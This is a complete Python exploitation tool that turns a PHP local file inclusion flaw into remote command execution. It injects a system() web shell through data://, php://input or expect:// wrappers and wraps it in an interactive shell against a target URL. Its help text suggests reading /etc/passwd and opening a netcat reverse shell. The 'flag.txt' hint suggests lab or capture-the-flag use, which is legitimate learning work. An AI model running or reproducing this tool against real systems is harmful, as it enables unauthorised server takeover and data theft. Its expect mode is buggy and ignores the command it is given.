#!/usr/bin/env python3

import requests
import base64
import argparse
import sys
import re
from urllib.parse import quote, urlencode
import readline  # For command history in interactive mode

class PHPWrapperShell:
    """Interactive shell using PHP wrappers for RCE via LFI"""
    
    def __init__(self, url, param, method='data', verbose=False):
        self.url = url
        self.param = param
        self.method = method
        self.verbose = verbose
        self.session = requests.Session()
        
        # Colors for output
        self.RED = '\033[91m'
        self.GREEN = '\033[92m'
        self.YELLOW = '\033[93m'
        self.BLUE = '\033[94m'
        self.RESET = '\033[0m'
        
    def create_webshell_payload(self):
        """Create the PHP web shell code"""
        return '<?php system($_GET["cmd"]); ?>'
    
    def execute_data_wrapper(self, command):
        """Execute command using data:// wrapper"""
        
        # Create web shell
        webshell = self.create_webshell_payload()
        
        # Base64 encode the web shell
        encoded_shell = base64.b64encode(webshell.encode()).decode()
        
        # Build the data:// wrapper payload
        payload = f"data://text/plain;base64,{encoded_shell}"
        
        # URL encode the payload
        encoded_payload = quote(payload, safe='')
        
        # Build full URL with command
        full_url = f"{self.url}?{self.param}={encoded_payload}&cmd={quote(command)}"
        
        if self.verbose:
            print(f"\n{self.BLUE}[DEBUG] URL:{self.RESET} {full_url}\n")
        
        try:
            response = self.session.get(full_url, timeout=15)
            
            if response.status_code == 200:
                return self.extract_command_output(response.text, command)
            else:
                return None, f"HTTP {response.status_code}"
                
        except Exception as e:
            return None, str(e)
    
    def execute_input_wrapper(self, command):
        """Execute command using php://input wrapper"""
        
        # Create web shell
        webshell = self.create_webshell_payload()
        
        # Build URL with cmd parameter
        full_url = f"{self.url}?{self.param}=php://input&cmd={quote(command)}"
        
        if self.verbose:
            print(f"\n{self.BLUE}[DEBUG] URL:{self.RESET} {full_url}")
            print(f"{self.BLUE}[DEBUG] POST Data:{self.RESET} {webshell}\n")
        
        try:
            response = self.session.post(full_url, data=webshell, timeout=15)
            
            if response.status_code == 200:
                return self.extract_command_output(response.text, command)
            else:
                return None, f"HTTP {response.status_code}"
                
        except Exception as e:
            return None, str(e)
    
    def execute_expect_wrapper(self, command):
        """Execute command using expect:// wrapper (rarely available)"""
        
        # Build expect:// payload
        payload = f"expect://id"
        encoded_payload = quote(payload, safe=':/')
        
        # Build full URL
        full_url = f"{self.url}?{self.param}={encoded_payload}"
        
        if self.verbose:
            print(f"\n{self.BLUE}[DEBUG] URL:{self.RESET} {full_url}\n")
        
        try:
            response = self.session.get(full_url, timeout=15)
            
            if response.status_code == 200:
                # Expect wrapper output is usually cleaner
                return response.text.strip(), None
            else:
                return None, f"HTTP {response.status_code}"
                
        except Exception as e:
            return None, str(e)
    
    def extract_command_output(self, html_response, command):
        """Extract command output from HTML response"""
        
        # Remove common HTML tags
        cleaned = re.sub(r'<script[^>]*>.*?</script>', '', html_response, flags=re.DOTALL)
        cleaned = re.sub(r'<style[^>]*>.*?</style>', '', cleaned, flags=re.DOTALL)
        cleaned = re.sub(r'<[^>]+>', '\n', cleaned)
        
        # Decode HTML entities
        cleaned = cleaned.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
        
        # Try to find command output
        # Look for common patterns that indicate command output
        lines = cleaned.split('\n')
        
        output_lines = []
        capture = False
        
        for line in lines:
            line = line.strip()
            
            # Skip empty lines and common web app text
            if not line or len(line) < 2:
                continue
            
            # Common indicators of command output
            if any(indicator in line.lower() for indicator in [
                'uid=', 'gid=', 'groups=',  # id command
                'drwx', '-rw-',  # ls command
                'total ',  # ls -l
                'root:', 'bin:', 'daemon:',  # passwd file
                'kernel', 'linux',  # uname
                '/',  # Paths
            ]):
                capture = True
            
            if capture and line and not line.startswith('<!'):
                output_lines.append(line)
        
        if output_lines:
            return '\n'.join(output_lines), None
        
        # If no clear output found, return the cleaned response
        return cleaned.strip(), None
    
    def execute_command(self, command):
        """Execute a command using the configured method"""
        
        if self.method == 'data':
            return self.execute_data_wrapper(command)
        elif self.method == 'input':
            return self.execute_input_wrapper(command)
        elif self.method == 'expect':
            return self.execute_expect_wrapper(command)
        else:
            return None, f"Unknown method: {self.method}"
    
    def test_connection(self):
        """Test if the wrapper method works"""
        
        print(f"{self.YELLOW}[*] Testing connection with '{self.method}' wrapper...{self.RESET}")
        
        output, error = self.execute_command('id')
        
        if error:
            print(f"{self.RED}[!] Error: {error}{self.RESET}")
            return False
        
        if output and ('uid=' in output or 'gid=' in output):
            print(f"{self.GREEN}[+] Success! Shell is working.{self.RESET}")
            print(f"{self.GREEN}[+] Output:{self.RESET}\n{output}\n")
            return True
        else:
            print(f"{self.RED}[!] Could not verify shell functionality{self.RESET}")
            print(f"{self.YELLOW}[*] Raw output:{self.RESET}\n{output}\n")
            return False
    
    def interactive_shell(self):
        """Run an interactive shell"""
        
        print(f"\n{self.GREEN}{'='*70}{self.RESET}")
        print(f"{self.GREEN}PHP Wrapper Interactive Shell{self.RESET}")
        print(f"{self.GREEN}{'='*70}{self.RESET}")
        print(f"Target: {self.url}")
        print(f"Parameter: {self.param}")
        print(f"Method: {self.method}")
        print(f"{self.GREEN}{'='*70}{self.RESET}\n")
        
        # Test connection first
        if not self.test_connection():
            response = input(f"\n{self.YELLOW}Connection test failed. Continue anyway? (y/n): {self.RESET}")
            if response.lower() != 'y':
                return
        
        print(f"\n{self.YELLOW}Type 'exit' or 'quit' to leave the shell{self.RESET}")
        print(f"{self.YELLOW}Type 'help' for available commands{self.RESET}\n")
        
        while True:
            try:
                # Prompt
                cmd = input(f"{self.BLUE}shell>{self.RESET} ").strip()
                
                if not cmd:
                    continue
                
                # Built-in commands
                if cmd.lower() in ['exit', 'quit']:
                    print(f"\n{self.YELLOW}[*] Exiting shell...{self.RESET}")
                    break
                
                if cmd.lower() == 'help':
                    self.print_help()
                    continue
                
                if cmd.lower() == 'clear':
                    import os
                    os.system('clear' if sys.platform != 'win32' else 'cls')
                    continue
                
                # Execute command
                output, error = self.execute_command(cmd)
                
                if error:
                    print(f"{self.RED}[!] Error: {error}{self.RESET}")
                elif output:
                    print(output)
                else:
                    print(f"{self.YELLOW}[*] Command executed but no output received{self.RESET}")
                
                print()  # Blank line for readability
                
            except KeyboardInterrupt:
                print(f"\n{self.YELLOW}[*] Use 'exit' to quit{self.RESET}")
                continue
            except EOFError:
                print(f"\n{self.YELLOW}[*] Exiting shell...{self.RESET}")
                break
    
    def print_help(self):
        """Print help information"""
        
        print(f"\n{self.GREEN}Available Commands:{self.RESET}")
        print(f"  exit, quit  - Exit the shell")
        print(f"  help        - Show this help message")
        print(f"  clear       - Clear the screen")
        print(f"  <command>   - Execute any system command")
        
        print(f"\n{self.GREEN}Useful Commands:{self.RESET}")
        print(f"  id                     - Show current user")
        print(f"  pwd                    - Print working directory")
        print(f"  ls -la                 - List files")
        print(f"  cat /etc/passwd        - Read files")
        print(f"  uname -a               - System information")
        print(f"  whoami                 - Current user")
        print(f"  find / -name flag.txt  - Find files")
        print(f"  nc -e /bin/bash <IP> <PORT> - Reverse shell")
        print()

def main():
    parser = argparse.ArgumentParser(
        description='PHP Wrapper RCE Exploitation Tool for LFI vulnerabilities',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Interactive shell using data:// wrapper
  %(prog)s http://target.com/index.php -i

  # Single command execution
  %(prog)s http://target.com/index.php -c "cat /etc/passwd"

  # Use php://input wrapper instead
  %(prog)s http://target.com/index.php -i -m input

  # Different parameter name
  %(prog)s http://target.com/page.php -p file -c "id"

  # Verbose mode to see requests
  %(prog)s http://target.com/index.php -i -v

  # Try expect:// wrapper (rarely works)
  %(prog)s http://target.com/index.php -c "whoami" -m expect

Note: This requires allow_url_include = On in PHP configuration
      Use check_allow_url_include.py first to verify vulnerability
        """
    )
    
    parser.add_argument('url', help='Target URL (e.g., http://target.com/index.php)')
    parser.add_argument('-p', '--param', default='language',
                       help='Vulnerable parameter name (default: language)')
    parser.add_argument('-i', '--interactive', action='store_true',
                       help='Interactive shell mode')
    parser.add_argument('-c', '--command',
                       help='Single command to execute')
    parser.add_argument('-m', '--method', default='data',
                       choices=['data', 'input', 'expect'],
                       help='PHP wrapper method (default: data)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output (show URLs and payloads)')
    
    args = parser.parse_args()
    
    # Create shell instance
    shell = PHPWrapperShell(args.url, args.param, args.method, args.verbose)
    
    if args.interactive:
        # Interactive mode
        shell.interactive_shell()
    elif args.command:
        # Single command mode
        print(f"{shell.YELLOW}[*] Executing: {args.command}{shell.RESET}\n")
        
        output, error = shell.execute_command(args.command)
        
        if error:
            print(f"{shell.RED}[!] Error: {error}{shell.RESET}")
            sys.exit(1)
        elif output:
            print(output)
        else:
            print(f"{shell.YELLOW}[*] Command executed but no output received{shell.RESET}")
    else:
        # No mode specified
        print(f"{shell.RED}[!] Error: Must specify either -i (interactive) or -c (command){shell.RESET}")
        print(f"Use -h for help")
        sys.exit(1)

if __name__ == '__main__':
    main()